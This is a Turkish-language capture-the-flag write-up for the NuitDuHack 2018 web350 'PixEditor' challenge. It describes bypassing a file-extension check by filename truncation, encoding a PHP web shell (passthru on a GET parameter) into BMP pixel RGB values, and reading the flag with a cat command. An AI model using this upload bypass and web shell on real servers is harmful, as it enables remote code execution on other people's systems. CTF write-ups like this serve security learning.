#NuitDuHack web350 

##PixEditor

```
Description

Create your own pixel art with this powerful tool.

Url
    http://pixeditor.challs.malice.fr/
```

Bu soruda pixeditor isimli js kodu çalıştırılıyor. Temel olarak yaptığınız şey RGB valueleri göndererek arkada belirli formatlarda BMP JPG gibi görseller oluşturulmasını sağlamak. Öncelikle gönderilen post datanın içeriğine bakıyoruz.

![ilk](https://github.com/csmali/hackedemedikki-CTF/blob/master/nuitduhack-2018/web350/pixeditor1.png "ilk")

save.php'ye data name ve format parametreleri ile RGB değerleri gönderiliyor. 


Öncelikle direkt olarak dosya uzantısını php yapmaya çalıştık ancak arkada kontrol edildiğini gördük.
Ardından bunu bypass etmek için dosya ismi uzunluğunu kullandık. Belirli bir karakter sınırını geçen dosya isimlerini arka tarafta kırptıklarını tespit ettik.

```
uzunstring.php.jpg
```
şeklinde verilen bir dosya ismini son 4 karakterini kırpacak şekilde düzgün formatta verirseniz eğer ve bu dosyaya erişirseniz serverin php kodu çalıştırmaya çalışacagını tespit ettik.

![ikinci](https://github.com/csmali/hackedemedikki-CTF/blob/master/nuitduhack-2018/web350/pixeditor2.png "ikinci")

Bundan sonra RGB valuelarını kullanarak php kodu göndermemiz gerekiyordu.Bunun için BMP en uygun format. Her piksel için 4 değer veriyorsunuz. Verdiğiniz ilk 3 değer direkt olarak renk kodlarını ifade ediyor Bunun için yazmak istediğiniz her karakterin ascii karşılıgını RGB değerlerinin her birine denk gelecek şekilde payload yarattık. Ayrıca her 3lü için bmp değerlerinin ters çevrilmesi gerektiğini gördük. Yani siz abc yazmak isterseniz cba ascii değerini ekleyip sonraki 3lüye geçmeniz gerekiyor
 
```
abcdefg stringi için

abc
[99,98,97,255]
def
[102,101,100,255]
g
[255,255,103,255]
```
gibi bir payload yaratmanız gerekiyor . 

Klasik php için kullandığımız command execution payloadu


```
 "<?echo passthru($_GET['cmd']); ?>"
```

Her karakteri el ile bulup yapmak zor oldugu için python scripti yazdım. payloadun ascii karşılığını alıp her üç karakteri reverse orderda birleştirmeyi sağlıyor. En son da paddingi yapıp aradaki boşluk ve virgülleri kaldırdım.

![ucuncu](https://github.com/csmali/hackedemedikki-CTF/blob/master/nuitduhack-2018/web350/pixeditor3.png "ucuncu")

Ardından bunu post datasının uzunlugunu bozmadan enjekte edince php kodu çalıştırabilir bir link aldık

```
 ?cmd=cat /flag
```
parametresi ile de flagi okuduk.

![ucuncu](https://github.com/csmali/hackedemedikki-CTF/blob/master/nuitduhack-2018/web350/pixeditor3.png "ucuncu")

